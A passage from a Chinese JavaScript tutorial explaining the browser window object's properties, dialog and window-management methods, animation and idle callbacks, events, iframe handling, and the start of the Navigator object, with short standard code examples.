~~~~~~~~~~

   以下属性返回 ``window`` 对象的位置信息和大小信息。

   **（1）window.screenX，window.screenY**

    ``window.screenX`` 和 ``window.screenY`` 属性，返回浏览器窗口左上角相对于当前屏幕左上角的水平距离和垂直距离（单位像素）。这两个属性只读。

   **（2） window.innerHeight，window.innerWidth**

    ``window.innerHeight`` 和 ``window.innerWidth`` 属性，返回网页在当前窗口中可见部分的高度和宽度，即“视口”（viewport）的大小（单位像素）。这两个属性只读。

   用户放大网页的时候（比如将网页从100%的大小放大为200%），这两个属性会变小。因为这时网页的像素大小不变（比如宽度还是960像素），只是每个像素占据的屏幕空间变大了，因此可见部分（视口）就变小了。

   注意，这两个属性值包括滚动条的高度和宽度。

   **（3）window.outerHeight，window.outerWidth**

    ``window.outerHeight`` 和 ``window.outerWidth`` 属性返回浏览器窗口的高度和宽度，包括浏览器菜单和边框（单位像素）。这两个属性只读。

   **（4）window.scrollX，window.scrollY**

    ``window.scrollX`` 属性返回页面的水平滚动距离， ``window.scrollY`` 属性返回页面的垂直滚动距离，单位都为像素。这两个属性只读。

   注意，这两个属性的返回值不是整数，而是双精度浮点数。如果页面没有滚动，它们的值就是 ``0`` 。

   举例来说，如果用户向下拉动了垂直滚动条75像素，那么 ``window.scrollY`` 就是75左右。用户水平向右拉动水平滚动条200像素， ``window.scrollX`` 就是200左右。

   .. code:: javascript

      if (window.scrollY < 75) {
        window.scroll(0, 75);
      }

   上面代码中，如果页面向下滚动的距离小于75像素，那么页面向下滚动75像素。

   **（5）window.pageXOffset，window.pageYOffset**

    ``window.pageXOffset`` 属性和 ``window.pageYOffset`` 属性，是 ``window.scrollX`` 和 ``window.scrollY`` 别名。

组件属性
~~~~~~~

   组件属性返回浏览器的组件对象。这样的属性有下面几个。

   -  ``window.locationbar`` ：地址栏对象
   -  ``window.menubar`` ：菜单栏对象
   -  ``window.scrollbars`` ：窗口的滚动条对象
   -  ``window.toolbar`` ：工具栏对象
   -  ``window.statusbar`` ：状态栏对象
   -  ``window.personalbar`` ：用户安装的个人工具栏对象

   这些对象的 ``visible`` 属性是一个布尔值，表示这些组件是否可见。这些属性只读。

   .. code:: javascript

      window.locationbar.visible
      window.menubar.visible
      window.scrollbars.visible
      window.toolbar.visible
      window.statusbar.visible
      window.personalbar.visible

全局对象属性
~~~~~~~~~~

   全局对象属性指向一些浏览器原生的全局对象。

   -  ``window.document`` ：指向 ``document`` 对象，详见《document 对象》一章。注意，这个属性有同源限制。只有来自同源的脚本才能读取这个属性。
   -  ``window.location`` ：指向 ``Location`` 对象，用于获取当前窗口的 URL 信息。它等同于 ``document.location`` 属性，详见《Location 对象》一章。
   -  ``window.navigator`` ：指向 ``Navigator`` 对象，用于获取环境信息，详见《Navigator 对象》一章。
   -  ``window.history`` ：指向 ``History`` 对象，表示浏览器的浏览历史，详见《History 对象》一章。
   -  ``window.localStorage`` ：指向本地储存的 localStorage 数据，详见《Storage 接口》一章。
   -  ``window.sessionStorage`` ：指向本地储存的 sessionStorage 数据，详见《Storage 接口》一章。
   -  ``window.console`` ：指向 ``console`` 对象，用于操作控制台，详见《console 对象》一章。
   -  ``window.screen`` ：指向 ``Screen`` 对象，表示屏幕信息，详见《Screen 对象》一章。

window.isSecureContext
~~~~~~~~~~~~~~~~~~~~~~~

    ``window.isSecureContext`` 属性返回一个布尔值，表示当前窗口是否处在加密环境。如果是 HTTPS 协议，就是 ``true`` ，否则就是 ``false`` 。

window 对象的方法
---------------


window.alert()，window.prompt()，window.confirm()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``window.alert()`` 、 ``window.prompt()`` 、 ``window.confirm()`` 都是浏览器与用户互动的全局方法。它们会弹出不同的对话框，要求用户做出回应。注意，这三个方法弹出的对话框，都是浏览器统一规定的式样，无法定制。

   **（1）window.alert()**

    ``window.alert()`` 方法弹出的对话框，只有一个“确定”按钮，往往用来通知用户某些信息。

   .. code:: javascript

      window.alert('Hello World');

   用户只有点击“确定”按钮，对话框才会消失。对话框弹出期间，浏览器窗口处于冻结状态，如果不点“确定”按钮，用户什么也干不了。

    ``window.alert()`` 方法的参数只能是字符串，没法使用 CSS 样式，但是可以用 ``\n`` 指定换行。

   .. code:: javascript

      alert('本条提示\n分成两行');

   **（2）window.prompt()**

    ``window.prompt()`` 方法弹出的对话框，提示文字的下方，还有一个输入框，要求用户输入信息，并有“确定”和“取消”两个按钮。它往往用来获取用户输入的数据。

   .. code:: javascript

      var result = prompt('您的年龄？', 25)

   上面代码会跳出一个对话框，文字提示为“您的年龄？”，要求用户在对话框中输入自己的年龄（默认显示25）。用户填入的值，会作为返回值存入变量 ``result`` 。

    ``window.prompt()`` 的返回值有两种情况，可能是字符串（有可能是空字符串），也有可能是 ``null`` 。具体分成三种情况。

   1. 用户输入信息，并点击“确定”，则用户输入的信息就是返回值。
   2. 用户没有输入信息，直接点击“确定”，则输入框的默认值就是返回值。
   3. 用户点击了“取消”（或者按了 ESC 按钮），则返回值是 ``null`` 。

    ``window.prompt()`` 方法的第二个参数是可选的，但是最好总是提供第二个参数，作为输入框的默认值。

   **（3）window.confirm()**

    ``window.confirm()`` 方法弹出的对话框，除了提示信息之外，只有“确定”和“取消”两个按钮，往往用来征询用户是否同意。

   .. code:: javascript

      var result = confirm('你最近好吗？');

   上面代码弹出一个对话框，上面只有一行文字“你最近好吗？”，用户选择点击“确定”或“取消”。

    ``confirm`` 方法返回一个布尔值，如果用户点击“确定”，返回 ``true`` ；如果用户点击“取消”，则返回 ``false`` 。

   .. code:: javascript

      var okay = confirm('Please confirm this message.');
      if (okay) {
        // 用户按下“确定”
      } else {
        // 用户按下“取消”
      }

    ``confirm`` 的一个用途是，用户离开当前页面时，弹出一个对话框，问用户是否真的要离开。

   .. code:: javascript

      window.onunload = function () {
        return window.confirm('你确定要离开当面页面吗？');
      }

   这三个方法都具有堵塞效应，一旦弹出对话框，整个页面就是暂停执行，等待用户做出反应。

window.open(), window.close()，window.stop()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

   **（1）window.open()**

    ``window.open`` 方法用于新建另一个浏览器窗口，类似于浏览器菜单的新建窗口选项。它会返回新窗口的引用，如果无法新建窗口，则返回 ``null`` 。

   .. code:: javascript

      var popup = window.open('somefile.html');

   上面代码会让浏览器弹出一个新建窗口，网址是当前域名下的 ``somefile.html`` 。

    ``open`` 方法一共可以接受三个参数。

   .. code:: javascript

      window.open(url, windowName, [windowFeatures])

   -  ``url`` ：字符串，表示新窗口的网址。如果省略，默认网址就是 ``about:blank`` 。
   -  ``windowName`` ：字符串，表示新窗口的名字。如果该名字的窗口已经存在，则占用该窗口，不再新建窗口。如果省略，就默认使用 ``_blank`` ，表示新建一个没有名字的窗口。另外还有几个预设值， ``_self`` 表示当前窗口， ``_top`` 表示顶层窗口， ``_parent`` 表示上一层窗口。
   -  ``windowFeatures`` ：字符串，内容为逗号分隔的键值对（详见下文），表示新窗口的参数，比如有没有提示栏、工具条等等。如果省略，则默认打开一个完整 UI 的新窗口。如果新建的是一个已经存在的窗口，则该参数不起作用，浏览器沿用以前窗口的参数。

   下面是一个例子。

   .. code:: javascript

      var popup = window.open(
        'somepage.html',
        'DefinitionsWindows',
        'height=200,width=200,location=no,status=yes,resizable=yes,scrollbars=yes'
      );

   上面代码表示，打开的新窗口高度和宽度都为200像素，没有地址栏，但有状态栏和滚动条，允许用户调整大小。

   第三个参数可以设定如下属性。

   - left：新窗口距离屏幕最左边的距离（单位像素）。注意，新窗口必须是可见的，不能设置在屏幕以外的位置。
   - top：新窗口距离屏幕最顶部的距离（单位像素）。
   - height：新窗口内容区域的高度（单位像素），不得小于100。
   - width：新窗口内容区域的宽度（单位像素），不得小于100。
   - outerHeight：整个浏览器窗口的高度（单位像素），不得小于100。
   - outerWidth：整个浏览器窗口的宽度（单位像素），不得小于100。
   - menubar：是否显示菜单栏。
   - toolbar：是否显示工具栏。
   - location：是否显示地址栏。
   - personalbar：是否显示用户自己安装的工具栏。
   - status：是否显示状态栏。
   - dependent：是否依赖父窗口。如果依赖，那么父窗口最小化，该窗口也最小化；父窗口关闭，该窗口也关闭。
   - minimizable：是否有最小化按钮，前提是 ``dialog=yes`` 。
   - noopener：新窗口将与父窗口切断联系，即新窗口的 ``window.opener`` 属性返回 ``null`` ，父窗口的 ``window.open()`` 方法也返回 ``null`` 。
   - resizable：新窗口是否可以调节大小。
   - scrollbars：是否允许新窗口出现滚动条。
   - dialog：新窗口标题栏是否出现最大化、最小化、恢复原始大小的控件。
   - titlebar：新窗口是否显示标题栏。
   - alwaysRaised：是否显示在所有窗口的顶部。
   - alwaysLowered：是否显示在父窗口的底下。
   - close：新窗口是否显示关闭按钮。

   对于那些可以打开和关闭的属性，设为 ``yes`` 或 ``1`` 或不设任何值就表示打开，比如 ``status=yes`` 、 ``status=1`` 、 ``status`` 都会得到同样的结果。如果想设为关闭，不用写 ``no`` ，而是直接省略这个属性即可。也就是说，如果在第三个参数中设置了一部分属性，其他没有被设置的 ``yes/no`` 属性都会被设成 ``no`` ，只有 ``titlebar`` 和关闭按钮除外（它们的值默认为 ``yes`` ）。

   上面这些属性，属性名与属性值之间用等号连接，属性与属性之间用逗号分隔。

   .. code:: javascript

      'height=200,width=200,location=no,status=yes,resizable=yes,scrollbars=yes'

   另外， ``open()`` 方法的第二个参数虽然可以指定已经存在的窗口，但是不等于可以任意控制其他窗口。为了防止被不相干的窗口控制，浏览器只有在两个窗口同源，或者目标窗口被当前网页打开的情况下，才允许 ``open`` 方法指向该窗口。

    ``window.open`` 方法返回新窗口的引用。

   .. code:: javascript

      var windowB = window.open('windowB.html', 'WindowB');
      windowB.window.name // "WindowB"

   注意，如果新窗口和父窗口不是同源的（即不在同一个域），它们彼此不能获取对方窗口对象的内部属性。

   下面是另一个例子。

   .. code:: javascript

      var w = window.open();
      console.log('已经打开新窗口');
      w.location = 'http://example.com';

   上面代码先打开一个新窗口，然后在该窗口弹出一个对话框，再将网址导向 ``example.com`` 。

   由于 ``open`` 这个方法很容易被滥用，许多浏览器默认都不允许脚本自动新建窗口。只允许在用户点击链接或按钮时，脚本做出反应，弹出新窗口。因此，有必要检查一下打开新窗口是否成功。

   .. code:: javascript

      var popup = window.open();
      if (popup === null) {
        // 新建窗口失败
      }

   **（2）window.close()**

    ``window.close`` 方法用于关闭当前窗口，一般只用来关闭 ``window.open`` 方法新建的窗口。

   .. code:: javascript

      popup.close()

   该方法只对顶层窗口有效， ``iframe`` 框架之中的窗口使用该方法无效。

   **（3）window.stop()**

    ``window.stop()`` 方法完全等同于单击浏览器的停止按钮，会停止加载图像、视频等正在或等待加载的对象。

   .. code:: javascript

      window.stop()

window.moveTo()，window.moveBy()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``window.moveTo()`` 方法用于移动浏览器窗口到指定位置。它接受两个参数，分别是窗口左上角距离屏幕左上角的水平距离和垂直距离，单位为像素。

   .. code:: javascript

      window.moveTo(100, 200)

   上面代码将窗口移动到屏幕 ``(100, 200)`` 的位置。

    ``window.moveBy()`` 方法将窗口移动到一个相对位置。它接受两个参数，分别是窗口左上角向右移动的水平距离和向下移动的垂直距离，单位为像素。

   .. code:: javascript

      window.moveBy(25, 50)

   上面代码将窗口向右移动25像素、向下移动50像素。

   为了防止有人滥用这两个方法，随意移动用户的窗口，目前只有一种情况，浏览器允许用脚本移动窗口：该窗口是用 ``window.open()`` 方法新建的，并且窗口里只有它一个 Tab 页。除此以外的情况，使用上面两个方法都是无效的。

window.resizeTo()，window.resizeBy()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``window.resizeTo()`` 方法用于缩放窗口到指定大小。

   它接受两个参数，第一个是缩放后的窗口宽度（ ``outerWidth`` 属性，包含滚动条、标题栏等等），第二个是缩放后的窗口高度（ ``outerHeight`` 属性）。

   .. code:: javascript

      window.resizeTo(
        window.screen.availWidth / 2,
        window.screen.availHeight / 2
      )

   上面代码将当前窗口缩放到，屏幕可用区域的一半宽度和高度。

    ``window.resizeBy()`` 方法用于缩放窗口。它与 ``window.resizeTo()`` 的区别是，它按照相对的量缩放， ``window.resizeTo()`` 需要给出缩放后的绝对大小。

   它接受两个参数，第一个是水平缩放的量，第二个是垂直缩放的量，单位都是像素。

   .. code:: javascript

      window.resizeBy(-200, -200)

   上面的代码将当前窗口的宽度和高度，都缩小200像素。

window.scrollTo()，window.scroll()，window.scrollBy()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``window.scrollTo`` 方法用于将文档滚动到指定位置。它接受两个参数，表示滚动后位于窗口左上角的页面坐标。

   .. code:: javascript

      window.scrollTo(x-coord, y-coord)

   它也可以接受一个配置对象作为参数。

   .. code:: javascript

      window.scrollTo(options)

   配置对象 ``options`` 有三个属性。

   -  ``top`` ：滚动后页面左上角的垂直坐标，即 y 坐标。
   -  ``left`` ：滚动后页面左上角的水平坐标，即 x 坐标。
   -  ``behavior`` ：字符串，表示滚动的方式，有三个可能值（ ``smooth`` 、 ``instant`` 、 ``auto`` ），默认值为 ``auto`` 。

   .. code:: javascript

      window.scrollTo({
        top: 1000,
        behavior: 'smooth'
      });

    ``window.scroll()`` 方法是 ``window.scrollTo()`` 方法的别名。

    ``window.scrollBy()`` 方法用于将网页滚动指定距离（单位像素）。它接受两个参数：水平向右滚动的像素，垂直向下滚动的像素。

   .. code:: javascript

      window.scrollBy(0, window.innerHeight)

   上面代码用于将网页向下滚动一屏。

   如果不是要滚动整个文档，而是要滚动某个元素，可以使用下面三个属性和方法。

   - Element.scrollTop
   - Element.scrollLeft
   - Element.scrollIntoView()

window.print()
~~~~~~~~~~~~~~~

    ``window.print`` 方法会跳出打印对话框，与用户点击菜单里面的“打印”命令效果相同。

   常见的打印按钮代码如下。

   .. code:: javascript

      document.getElementById('printLink').onclick = function () {
        window.print();
      }

   非桌面设备（比如手机）可能没有打印功能，这时可以这样判断。

   .. code:: javascript

      if (typeof window.print === 'function') {
        // 支持打印功能
      }

window.focus()，window.blur()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``window.focus()`` 方法会激活窗口，使其获得焦点，出现在其他窗口的前面。

   .. code:: javascript

      var popup = window.open('popup.html', 'Popup Window');
   
      if ((popup !== null) && !popup.closed) {
        popup.focus();
      }

   上面代码先检查 ``popup`` 窗口是否依然存在，确认后激活该窗口。

    ``window.blur()`` 方法将焦点从窗口移除。

   当前窗口获得焦点时，会触发 ``focus`` 事件；当前窗口失去焦点时，会触发 ``blur`` 事件。

window.getSelection()
~~~~~~~~~~~~~~~~~~~~~~

    ``window.getSelection`` 方法返回一个 ``Selection`` 对象，表示用户现在选中的文本。

   .. code:: javascript

      var selObj = window.getSelection();

   使用 ``Selection`` 对象的 ``toString`` 方法可以得到选中的文本。

   .. code:: javascript

      var selectedText = selObj.toString();

window.getComputedStyle()，window.matchMedia()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``window.getComputedStyle()`` 方法接受一个元素节点作为参数，返回一个包含该元素的最终样式信息的对象，详见《CSS 操作》一章。

    ``window.matchMedia()`` 方法用来检查 CSS 的 ``mediaQuery`` 语句，详见《CSS 操作》一章。

window.requestAnimationFrame()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``window.requestAnimationFrame()`` 方法跟 ``setTimeout`` 类似，都是推迟某个函数的执行。不同之处在于， ``setTimeout`` 必须指定推迟的时间， ``window.requestAnimationFrame()`` 则是推迟到浏览器下一次重流时执行，执行完才会进行下一次重绘。重绘通常是 16ms 执行一次，不过浏览器会自动调节这个速率，比如网页切换到后台 Tab 页时， ``requestAnimationFrame()`` 会暂停执行。

   如果某个函数会改变网页的布局，一般就放在 ``window.requestAnimationFrame()`` 里面执行，这样可以节省系统资源，使得网页效果更加平滑。因为慢速设备会用较慢的速率重流和重绘，而速度更快的设备会有更快的速率。

   该方法接受一个回调函数作为参数。

   .. code:: javascript

      window.requestAnimationFrame(callback)

   上面代码中， ``callback`` 是一个回调函数。 ``callback`` 执行时，它的参数就是系统传入的一个高精度时间戳（ ``performance.now()`` 的返回值），单位是毫秒，表示距离网页加载的时间。

    ``window.requestAnimationFrame()`` 的返回值是一个整数，这个整数可以传入 ``window.cancelAnimationFrame()`` ，用来取消回调函数的执行。

   下面是一个 ``window.requestAnimationFrame()`` 执行网页动画的例子。

   .. code:: javascript

      var element = document.getElementById('animate');
      element.style.position = 'absolute';
   
      var start = null;
   
      function step(timestamp) {
        if (!start) start = timestamp;
        var progress = timestamp - start;
        // 元素不断向右移，最大不超过200像素
        element.style.left = Math.min(progress / 10, 200) + 'px';
        // 如果距离第一次执行不超过 2000 毫秒，
        // 就继续执行动画
        if (progress < 2000) {
          window.requestAnimationFrame(step);
        }
      }
   
      window.requestAnimationFrame(step);

   上面代码定义了一个网页动画，持续时间是2秒，会让元素向右移动。

window.requestIdleCallback()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``window.requestIdleCallback()`` 跟 ``setTimeout`` 类似，也是将某个函数推迟执行，但是它保证将回调函数推迟到系统资源空闲时执行。也就是说，如果某个任务不是很关键，就可以使用 ``window.requestIdleCallback()`` 将其推迟执行，以保证网页性能。

   它跟 ``window.requestAnimationFrame()`` 的区别在于，后者指定回调函数在下一次浏览器重排时执行，问题在于下一次重排时，系统资源未必空闲，不一定能保证在16毫秒之内完成； ``window.requestIdleCallback()`` 可以保证回调函数在系统资源空闲时执行。

   该方法接受一个回调函数和一个配置对象作为参数。配置对象可以指定一个推迟执行的最长时间，如果过了这个时间，回调函数不管系统资源有无空闲，都会执行。

   .. code:: javascript

      window.requestIdleCallback(callback[, options])

    ``callback`` 参数是一个回调函数。该回调函数执行时，系统会传入一个 ``IdleDeadline`` 对象作为参数。 ``IdleDeadline`` 对象有一个 ``didTimeout`` 属性（布尔值，表示是否为超时调用）和一个 ``timeRemaining()`` 方法（返回该空闲时段剩余的毫秒数）。

    ``options`` 参数是一个配置对象，目前只有 ``timeout`` 一个属性，用来指定回调函数推迟执行的最大毫秒数。该参数可选。

    ``window.requestIdleCallback()`` 方法返回一个整数。该整数可以传入 ``window.cancelIdleCallback()`` 取消回调函数。

   下面是一个例子。

   .. code:: javascript

      requestIdleCallback(myNonEssentialWork);
   
      function myNonEssentialWork(deadline) {
        while (deadline.timeRemaining() > 0) {
          doWorkIfNeeded();
        }
      }

   上面代码中， ``requestIdleCallback()`` 用来执行非关键任务 ``myNonEssentialWork`` 。该任务先确认本次空闲时段有剩余时间，然后才真正开始执行任务。

   下面是指定 ``timeout`` 的例子。

   .. code:: javascript

      requestIdleCallback(processPendingAnalyticsEvents, { timeout: 2000 });

   上面代码指定， ``processPendingAnalyticsEvents`` 必须在未来2秒之内执行。

   如果由于超时导致回调函数执行，则 ``deadline.timeRemaining()`` 返回 ``0`` ， ``deadline.didTimeout`` 返回 ``true`` 。

   如果多次执行 ``window.requestIdleCallback()`` ，指定多个回调函数，那么这些回调函数将排成一个队列，按照先进先出的顺序执行。

事件
---

    ``window`` 对象可以接收以下事件。

load 事件和 onload 属性
~~~~~~~~~~~~~~~~~~~~~

    ``load`` 事件发生在文档在浏览器窗口加载完毕时。 ``window.onload`` 属性可以指定这个事件的回调函数。

   .. code:: javascript

      window.onload = function() {
        var elements = document.getElementsByClassName('example');
        for (var i = 0; i < elements.length; i++) {
          var elt = elements[i];
          // ...
        }
      };

   上面代码在网页加载完毕后，获取指定元素并进行处理。

error 事件和 onerror 属性
~~~~~~~~~~~~~~~~~~~~~~~

   浏览器脚本发生错误时，会触发 ``window`` 对象的 ``error`` 事件。我们可以通过 ``window.onerror`` 属性对该事件指定回调函数。

   .. code:: javascript

      window.onerror = function (message, filename, lineno, colno, error) {
        console.log("出错了！--> %s", error.stack);
      };

   由于历史原因， ``window`` 的 ``error`` 事件的回调函数不接受错误对象作为参数，而是一共可以接受五个参数，它们的含义依次如下。

   - 出错信息
   - 出错脚本的网址
   - 行号
   - 列号
   - 错误对象

   老式浏览器只支持前三个参数。

   并不是所有的错误，都会触发 JavaScript 的 ``error`` 事件（即让 JavaScript 报错）。一般来说，只有 JavaScript 脚本的错误，才会触发这个事件，而像资源文件不存在之类的错误，都不会触发。

   下面是一个例子，如果整个页面未捕获错误超过3个，就显示警告。

   .. code:: javascript

      window.onerror = function(msg, url, line) {
        if (onerror.num++ > onerror.max) {
          alert('ERROR: ' + msg + '\n' + url + ':' + line);
          return true;
        }
      }
      onerror.max = 3;
      onerror.num = 0;

   需要注意的是，如果脚本网址与网页网址不在同一个域（比如使用了 CDN），浏览器根本不会提供详细的出错信息，只会提示出错，错误类型是“Script error.”，行号为0，其他信息都没有。这是浏览器防止向外部脚本泄漏信息。一个解决方法是在脚本所在的服务器，设置 ``Access-Control-Allow-Origin`` 的 HTTP 头信息。

   .. code:: bash

      Access-Control-Allow-Origin: *

   然后，在网页的 ``<script>`` 标签中设置 ``crossorigin`` 属性。

   .. code:: html

      <script crossorigin="anonymous" src="//example.com/file.js"></script>

   上面代码的 ``crossorigin="anonymous"`` 表示，读取文件不需要身份信息，即不需要 cookie 和 HTTP 认证信息。如果设为 ``crossorigin="use-credentials"`` ，就表示浏览器会上传 cookie 和 HTTP 认证信息，同时还需要服务器端打开 HTTP 头信息 ``Access-Control-Allow-Credentials`` 。

window 对象的事件监听属性
~~~~~~~~~~~~~~~~~~~~~~

   除了具备元素节点都有的 GlobalEventHandlers 接口， ``window`` 对象还具有以下的事件监听函数属性。

   -  ``window.onafterprint`` ： ``afterprint`` 事件的监听函数。
   -  ``window.onbeforeprint`` ： ``beforeprint`` 事件的监听函数。
   -  ``window.onbeforeunload`` ： ``beforeunload`` 事件的监听函数。
   -  ``window.onhashchange`` ： ``hashchange`` 事件的监听函数。
   -  ``window.onlanguagechange`` :  ``languagechange`` 的监听函数。
   -  ``window.onmessage`` ： ``message`` 事件的监听函数。
   -  ``window.onmessageerror`` ： ``MessageError`` 事件的监听函数。
   -  ``window.onoffline`` ： ``offline`` 事件的监听函数。
   -  ``window.ononline`` ： ``online`` 事件的监听函数。
   -  ``window.onpagehide`` ： ``pagehide`` 事件的监听函数。
   -  ``window.onpageshow`` ： ``pageshow`` 事件的监听函数。
   -  ``window.onpopstate`` ： ``popstate`` 事件的监听函数。
   -  ``window.onstorage`` ： ``storage`` 事件的监听函数。
   -  ``window.onunhandledrejection`` ：未处理的 Promise 对象的 ``reject`` 事件的监听函数。
   -  ``window.onunload`` ： ``unload`` 事件的监听函数。

多窗口操作
--------

   由于网页可以使用 ``iframe`` 元素，嵌入其他网页，因此一个网页之中会形成多个窗口。如果子窗口之中又嵌入别的网页，就会形成多级窗口。

窗口的引用
~~~~~~~~

   各个窗口之中的脚本，可以引用其他窗口。浏览器提供了一些特殊变量，用来返回其他窗口。

   -  ``top`` ：顶层窗口，即最上层的那个窗口
   -  ``parent`` ：父窗口
   -  ``self`` ：当前窗口，即自身

   下面代码可以判断，当前窗口是否为顶层窗口。

   .. code:: javascript

      if (window.top === window.self) {
        // 当前窗口是顶层窗口
      } else {
        // 当前窗口是子窗口
      }

   下面的代码让父窗口的访问历史后退一次。

   .. code:: javascript

      window.parent.history.back();

   与这些变量对应，浏览器还提供一些特殊的窗口名，供 ``window.open()`` 方法、 ``<a>`` 标签、 ``<form>`` 标签等引用。

   -  ``_top`` ：顶层窗口
   -  ``_parent`` ：父窗口
   -  ``_blank`` ：新窗口

   下面代码就表示在顶层窗口打开链接。

   .. code:: html

      <a href="somepage.html" target="_top">Link</a>

iframe 元素
~~~~~~~~~~

   对于 ``iframe`` 嵌入的窗口， ``document.getElementById`` 方法可以拿到该窗口的 DOM 节点，然后使用 ``contentWindow`` 属性获得 ``iframe`` 节点包含的 ``window`` 对象。

   .. code:: javascript

      var frame = document.getElementById('theFrame');
      var frameWindow = frame.contentWindow;

   上面代码中， ``frame.contentWindow`` 可以拿到子窗口的 ``window`` 对象。然后，在满足同源限制的情况下，可以读取子窗口内部的属性。

   .. code:: javascript

      // 获取子窗口的标题
      frameWindow.title

    ``<iframe>`` 元素的 ``contentDocument`` 属性，可以拿到子窗口的 ``document`` 对象。

   .. code:: javascript

      var frame = document.getElementById('theFrame');
      var frameDoc = frame.contentDocument;
   
      // 等同于
      var frameDoc = frame.contentWindow.document;

    ``<iframe>`` 元素遵守同源政策，只有当父窗口与子窗口在同一个域时，两者之间才可以用脚本通信，否则只有使用 ``window.postMessage`` 方法。

    ``<iframe>`` 窗口内部，使用 ``window.parent`` 引用父窗口。如果当前页面没有父窗口，则 ``window.parent`` 属性返回自身。因此，可以通过 ``window.parent`` 是否等于 ``window.self`` ，判断当前窗口是否为 ``iframe`` 窗口。

   .. code:: javascript

      if (window.parent !== window.self) {
        // 当前窗口是子窗口
      }

    ``<iframe>`` 窗口的 ``window`` 对象，有一个 ``frameElement`` 属性，返回 ``<iframe>`` 在父窗口中的 DOM 节点。对于非嵌入的窗口，该属性等于 ``null`` 。

   .. code:: javascript

      var f1Element = document.getElementById('f1');
      var f1Window = f1Element.contentWindow;
   
      f1Window.frameElement === f1Element // true
      window.frameElement === null // true

window.frames 属性
~~~~~~~~~~~~~~~~~~

    ``window.frames`` 属性返回一个类似数组的对象，成员是所有子窗口的 ``window`` 对象。可以使用这个属性，实现窗口之间的互相引用。比如， ``frames[0]`` 返回第一个子窗口， ``frames[1].frames[2]`` 返回第二个子窗口内部的第三个子窗口， ``parent.frames[1]`` 返回父窗口的第二个子窗口。

   注意， ``window.frames`` 每个成员的值，是框架内的窗口（即框架的 ``window`` 对象），而不是 ``iframe`` 标签在父窗口的 DOM 节点。如果要获取每个框架内部的 DOM 树，需要使用 ``window.frames[0].document`` 的写法。

   另外，如果 ``<iframe>`` 元素设置了 ``name`` 或 ``id`` 属性，那么属性值会自动成为全局变量，并且可以通过 ``window.frames`` 属性引用，返回子窗口的 ``window`` 对象。

   .. code:: javascript

      // HTML 代码为 <iframe id="myFrame">
      window.myFrame // [HTMLIFrameElement]
      frames.myframe === myFrame // true

   另外， ``name`` 属性的值会自动成为子窗口的名称，可以用在 ``window.open`` 方法的第二个参数，或者 ``<a>`` 和 ``<frame>`` 标签的 ``target`` 属性。

/🟠 Navigator 对象，Screen 对象。
===============================

    ``window.navigator`` 属性指向一个包含浏览器和系统信息的 Navigator 对象。脚本通过这个属性了解用户的环境信息。

Navigator 对象的属性
------------------


Navigator.userAgent
~~~~~~~~~~~~~~~~~~~~

    ``navigator.userAgent`` 属性返回浏览器的 User Agent 字符串，表示用户设备信息，包含了浏览器的厂商、版本、操作系统等信息。

   下面是 Chrome 浏览器的 ``userAgent`` 。

   .. code:: javascript

      navigator.userAgent
      // "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36"

   通过 ``userAgent`` 属性识别浏览器，不是一个好办法。因为必须考虑所有的情况（不同的浏览器，不同的版本），非常麻烦，而且用户可以改变这个字符串。这个字符串的格式并无统一规定，也无法保证未来的适用性，各种上网设备层出不穷，难以穷尽。所以，现在一般不再通过它识别浏览器了，而是使用“功能识别”方法，即逐一测试当前浏览器是否支持要用到的 JavaScript 功能。

   不过，通过 ``userAgent`` 可以大致准确地识别手机浏览器，方法就是测试是否包含 ``mobi`` 字符串。

   .. code:: javascript

      var ua = navigator.userAgent.toLowerCase();
   
      if (/mobi/.test(ua)) {
        // 手机浏览器
      } else {
        // 非手机浏览器
      }

   如果想要识别所有移动设备的浏览器，可以测试更多的特征字符串。

   .. code:: javascript

      /mobi|android|touch|mini/.test(ua)

Navigator.plugins
~~~~~~~~~~~~~~~~~~

    ``Navigator.plugins`` 属性返回一个类似数组的对象，成员是 Plugin 实例对象，表示浏览器安装的插件，比如 Flash、ActiveX 等。

   .. code:: javascript

      var pluginsLength = navigator.plugins.length;
   
      for (var i = 0; i < pluginsLength; i++) {
        console.log(navigator.plugins[i].name);
        console.log(navigator.plugins[i].filename);
        console.log(navigator.plugins[i].description);
        console.log(navigator.plugins[i].version);
      }

Navigator.platform
~~~~~~~~~~~~~~~~~~~

    ``Navigator.platform`` 属性返回用户的操作系统信息，比如 ``MacIntel`` 、 ``Win32`` 、 ``Linux x86_64`` 等 。

   .. code:: javascript

      navigator.platform
      // "Linux x86_64"

Navigator.onLine
~~~~~~~~~~~~~~~~~

    ``navigator.onLine`` 属性返回一个布尔值，表示用户当前在线还是离线（浏览器断线）。

   .. code:: javascript

      navigator.onLine // true

   有时，浏览器可以连接局域网，但是局域网不能连通外网。这时，有的浏览器的 ``onLine`` 属性会返回 ``true`` ，所以不能假定只要是 ``true`` ，用户就一定能访问互联网。不过，如果是 ``false`` ，可以断定用户一定离线。

   用户变成在线会触发 ``online`` 事件，变成离线会触发 ``offline`` 事件，可以通过 ``window.ononline`` 和 ``window.onoffline`` 指定这两个事件的回调函数。

   .. code:: javascript

      window.addEventListener('offline', function(e) { console.log('offline'); });
      window.addEventListener('online', function(e) { console.log('online'); });

Navigator.language，Navigator.languages
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``Navigator.language`` 属性返回一个字符串，表示浏览器的首选语言。该属性只读。

   .. code:: javascript

      navigator.language // "en"

    ``Navigator.languages`` 属性返回一个数组，表示用户可以接受的语言。 ``Navigator.language`` 总是这个数组的第一个成员。HTTP 请求头信息的 ``Accept-Language`` 字段，就来自这个数组。

   .. code:: javascript

      navigator.languages  // ["en-US", "en", "zh-CN", "zh", "zh-TW"]

   如果这个属性发生变化，就会在 ``window`` 对象上触发 ``languagechange`` 事件。

Navigator.geolocation
